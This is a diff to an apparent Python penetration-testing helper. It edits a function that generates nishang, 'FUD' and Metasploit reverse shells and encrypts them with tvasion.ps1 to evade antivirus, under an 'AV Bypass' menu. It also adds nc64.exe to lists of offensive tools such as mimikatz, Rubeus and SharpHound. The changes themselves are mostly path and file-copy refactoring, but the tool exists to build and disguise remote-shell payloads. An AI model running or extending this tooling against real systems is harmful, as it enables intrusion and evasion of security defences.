@@ -483,14 +483,15 @@ def third_tools(name):
 
 def tvasion(ip,port,type,shell):
     tmp_folder = temp_folder()
-    temp = "/"+tmp_folder+"/"
+    temp = "/tmp/"+tmp_folder+"/"
+    readed_data = ''
     if type == "nishang":
         nishang_name = nishang(ip,port)
-        nishang_path = str(current_path)+"/"+nishang_name
-        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
-        path_to_encrypted = str(current_path)+temp #get the path
+        nishang_path = check_space(str(current_path))+"/"+nishang_name
+        dir1 = subprocess.check_output(["mkdir", temp]) #create a temp folder
+        path_to_encrypted = temp #get the path
         enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path
-        args = " -t ps1 "+nishang_path+ " -o "+tmp_folder #save the file into temp folder
+        args = " -t ps1 "+nishang_path+ " -o "+temp #save the file into temp folder
         command = enc_tool_path+args
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
         output = process.communicate()
@@ -499,16 +500,23 @@ def tvasion(ip,port,type,shell):
         exact_file_name_path = path_to_encrypted+en_file_name #encrypted nishang
         final_shell = current_path+"/en-"+nishang_name
         original_shell = current_path+"/"+nishang_name
-        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
+        #copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir   
+        try:
+            with open(exact_file_name_path, 'r') as infile:
+                for myline in infile:
+                    readed_data += myline      
+        except IOError:
+            print ("error opening file")
+        write_to_file(final_shell,readed_data)    
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
         delete_original = subprocess.check_output(["rm",original_shell])
     elif type == "FUD reverse shell":
         fud_name = FUD(ip,port)
-        fud_path = str(current_path)+"/"+fud_name
-        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
-        path_to_encrypted = str(current_path)+temp #get the path
+        fud_path = check_space(str(current_path))+"/"+fud_name
+        dir1 = subprocess.check_output(["mkdir", temp]) #create a temp folder
+        path_to_encrypted = temp #get the path
         enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path
-        args = " -t ps1 "+fud_path+ " -o "+tmp_folder #save the file into temp folder
+        args = " -t ps1 "+fud_path+ " -o "+temp #save the file into temp folder
         command = enc_tool_path+args
         #encr = subprocess.check_output([command]) #excute  the encryption
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
@@ -518,16 +526,24 @@ def tvasion(ip,port,type,shell):
         exact_file_name_path = path_to_encrypted+en_file_name #encrypted nishang
         final_shell = current_path+"/en-"+fud_name
         original_shell = current_path+"/"+fud_name
-        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
+        #copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir 
+        try:
+            with open(exact_file_name_path, 'r') as infile:
+                for myline in infile:
+                    readed_data += myline     
+        except IOError:
+            print ("error opening file")
+        write_to_file(final_shell,readed_data)   
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
         delete_original = subprocess.check_output(["rm",original_shell])        
     elif type == "msf":
+        data = b''
         shell_name = msfc(ip,port,shell)
-        shell_path = str(current_path)+"/"+shell_name
-        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
-        path_to_encrypted = str(current_path)+temp #get the path
+        shell_path = check_space(str(current_path))+"/"+shell_name
+        dir1 = subprocess.check_output(["mkdir", temp]) #create a temp folder
+        path_to_encrypted = temp #get the path
         enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path
-        args = " -t exe "+shell_path+ " -o "+tmp_folder #save the file into temp folder
+        args = " -t exe "+shell_path+ " -o "+temp #save the file into temp folder
         command = enc_tool_path+args
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
         output = process.communicate()
@@ -535,7 +551,7 @@ def tvasion(ip,port,type,shell):
         en_file_name = res.decode('UTF-8').strip() # get encrypted file name
         exact_file_name_path = path_to_encrypted+en_file_name
         final_shell = current_path+"/"+shell_name
-        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
+        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
 
 
@@ -594,7 +610,7 @@ windows_shells = ["nishang shell","FUD reverse shell","windows/exec","windows/x6
 linux_shell = ["bash","nc","simple php","full php","python","perl","rce shell","ruby","java","linux/x86/meterpreter/reverse_tcp"]
 linux_tools = ["LinEnum.sh","linpeas.sh","lse.sh","nc","pspy64","pwncat"]
 windows_enum = ["jaws.ps1","PowerUp.ps1","Sherlock.ps1","winPEAS.bat","wp.exe"]
-windows_exec_tools = ["accesschk.exe","curl.exe","nc.exe","wget.exe","base64.exe","dumpcap.exe","procdump64.exe","chisel86.exe","juicy.exe","Rubeus.exe","cmd.exe","mimikatz64.exe","powershell.exe","SharpHound.exe"]
+windows_exec_tools = ["accesschk.exe","curl.exe","nc.exe","nc64.exe","wget.exe","base64.exe","dumpcap.exe","procdump64.exe","chisel86.exe","juicy.exe","Rubeus.exe","cmd.exe","mimikatz64.exe","powershell.exe","SharpHound.exe"]
 windows_ps1_tools = ["powerview.ps1","powercat.ps1","powermad.ps1","PowerUpSQL.ps1"]
 magic_bytes = ["jpg simple php magic bytes","jpg full php magic bytes","gif simple php magic bytes","gif full php magic bytes"]
 template = ["python","php","smb-login-brute.sh"]
@@ -685,7 +701,9 @@ if os_item == "Windows":
         elif windows_tools_item == "curl.exe":
             move_files("windows","tools",windows_tools_item)
         elif windows_tools_item == "nc.exe":
-            move_files("windows","tools",windows_tools_item)                                
+            move_files("windows","tools",windows_tools_item)
+        elif windows_tools_item == "nc64.exe":
+            move_files("windows","tools",windows_tools_item)                                            
         elif windows_tools_item == "wget.exe":
             move_files("windows","tools",windows_tools_item) 
         elif windows_tools_item == "base64.exe":
@@ -806,7 +824,7 @@ elif os_item == "AV Bypass":
             tvasion(ip,port,"msf",msf_item)
 elif os_item == "install scripts":
     items = []
-    questions = [inquirer.Checkbox('scripts',message="use space to select tool(s) and press enter for install ",choices=['smb-login-brute.sh','oneliner.py'],)]
+    questions = [inquirer.Checkbox('scripts',message="use space to select tool(s) and press enter for install ",choices=['smb-login-brute.sh','oneliner.py','basic-web-enum.py'],)]
     answers = inquirer.prompt(questions)
     if len(answers['scripts']) == 0:
         print(Fore.RED+"[-] No script selected !")
